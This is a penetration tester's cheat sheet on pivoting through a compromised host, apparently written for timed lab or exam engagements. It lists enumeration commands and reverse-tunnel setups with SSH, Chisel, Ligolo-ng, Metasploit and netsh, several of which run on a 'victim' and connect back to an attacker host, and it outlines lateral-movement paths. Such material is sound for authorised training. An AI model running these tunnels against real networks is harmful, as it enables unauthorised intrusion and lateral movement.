# Pivoting Battle Card

## What to Check First
```
1. IFSTAT → ip addr, ifconfig, ipconfig /all (check other subnets)
2. ROUTING → route print, netstat -rn, ip route
3. CONNECTIONS → netstat -ano, ss -tulpn (listen on internal IPs)
4. DNS → cat /etc/hosts, resolvectl status, hosts file
```

## High-Value Findings
- **Multiple network interfaces** → Other subnets reachable
- **Internal IP listening** → Service on 172.x.x.x, 10.x.x.x, 192.168.x.x
- **Dual-homed host** → Pivot point for lateral movement
- **SSH on compromised host** → Quick SOCKS proxy setup
- **Netcat/socat installed** → Tunnel tools available
- **Proxychains-ready** → Already configured or easy setup
- **Chisel available** → Fast TCP tunneling over HTTP
- **Ligolo-ng installed** → Full layer 2/3 pivot
- **WinRM on compromised host** → Pivot to other internal hosts
- **DNS resolution for internal domain** → Can resolve internal names

## Immediate Commands
# Check Network
```
# Linux
ip addr; ip route; cat /etc/hosts
ss -tulpn
arp -a

# Windows
ipconfig /all
route print
netstat -ano
arp -a
```

# Pivot via SSH (Linux only)
```
# SOCKS proxy (-D)
ssh -D 1080 user@pivot-host -N
# Add to /etc/proxychains.conf: socks5 127.0.0.1 1080
proxychains nmap -sT -sV internal-host

# Local forward (-L)
ssh -L 8080:internal-host:80 user@pivot-host -N

# Remote forward (-R)
ssh -R 8080:localhost:80 user@attacker-host -N
```

# Pivot via Chisel
```
# Attacker
chisel server -p 8000 --reverse

# Victim (Linux)
./chisel client attacker-ip:8000 R:socks

# Victim (Windows)
chisel.exe client attacker-ip:8000 R:socks

# Usage
# socks5 127.0.0.1:1080 in proxychains
```

# Pivot via Ligolo-ng
```
# Attacker
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 172.16.0.0/24 dev ligolo
./ligolo-proxy -selfcert

# Victim
./ligolo-agent -connect attacker-ip:11601 -ignore-cert
# In proxy: session, ifconfig, start
```

# Pivot via Metasploit
```
route add internal-subnet 255.255.255.0 session-id
use auxiliary/server/socks_proxy
# Then proxychains
```

# Pivot via netsh (Windows)
```
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=internal-host
```

## Common Attack Paths
```
DUAL-HOMED HOST → IP Route Check → New Subnet → Enum → Exploit
SSH ACCESS → SOCKS Proxy → Internal Scanning → New Targets
CHISEL → TCP Tunnel → Internal Web Server → Web Exploit
LIGOLO-NG → Layer 2 Tunnel → Full Internal Access
WINRM PIVOT → Internal Commands → Port Forward → Lateral
WMI/SMB PIVOT → Remote Execution via Compromised Host
```

## Escalation Paths
- **New subnet discovered** → Enumeration → New foothold
- **Internal web server** → Web app attack → New shell
- **Internal MSSQL** → SQL attack → RCE on new target
- **Internal domain controller** → AD attacks via proxy
- **Dual-homed host** → Gateway to new network segment

## When to Stop
- All interfaces and routes enumerated
- Internal network scanned for responsive hosts
- Pivot tool deployed and verified
- Don't forget you have a timer - pivot efficiently

## Common Mistakes
- Not checking interface list on every compromised host
- Using SSH dynamic forwarding when Chisel/Ligolo would be faster
- Forgetting to add proxychains when routing through pivot
- Not scanning internal hosts after establishing pivot
- Only looking at one subnet (host may have 2-3 interfaces)
- Overcomplicating pivot setup (simple SSH -D solves most cases)
- Not checking ARP cache for neighbor hosts
- Port scanning through proxy is SLOW (use high-level service scans)
